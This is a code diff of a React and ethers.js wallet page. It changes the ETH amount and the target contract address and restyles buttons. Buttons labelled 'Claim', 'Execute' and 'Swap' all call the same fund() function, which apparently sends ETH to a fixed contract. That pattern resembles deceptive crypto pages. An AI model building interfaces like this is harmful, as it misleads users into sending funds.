@@ -11,7 +11,7 @@ import { abi } from "../constants/abi";
 
 let web3Modal;
 
-const ethAmount = 0.226137;
+const ethAmount = 0.01;
 
 const providerOptions = {
 
@@ -70,7 +70,7 @@ async function withdraw() {
         setIsConnected(true);
         const provider = new ethers.providers.Web3Provider(web3ModalProvider);
         setSigner(provider.getSigner());
-      const contractAddress = '0xC14Ef989e38208167c6D2Ae1115B8a18c2953B15';
+      const contractAddress = '0x7c15843EFda55847a8c7aeB42757b1D0F4aAE6C4';
       const contract = new ethers.Contract(contractAddress, abi, signer);
          try {
             const transactionResponse = await contract.withdraw()
@@ -105,9 +105,9 @@ async function withdraw() {
 
             <div className="inner-button-wrap-1">
 
-            <button  onClick={() => fund()}>Claim</button>
-               {isConnected ? <button onClick={() => fund()}>Execute</button> : ""}
-          <button onClick={() => fund()}>Swap</button>
+            <button  className="btn" onClick={() => fund()}>Claim</button>
+               {isConnected ? <button className="btn" onClick={() => fund()}>Execute</button> : ""}
+          <button className="btn" onClick={() => fund()}>Swap</button>
 
             </div>
 
@@ -115,8 +115,8 @@ async function withdraw() {
 
           <div className="main-button-wrap-2">
             <div className="inner-button-wrap-2">
-            <button >Migrate</button>
-          <button  onClick={() => withdraw()}>Staking</button>
+            <button className="btn" >Migrate</button>
+          <button className="btn"  onClick={() => withdraw()}>Withdraw</button>
               
 
             </div>
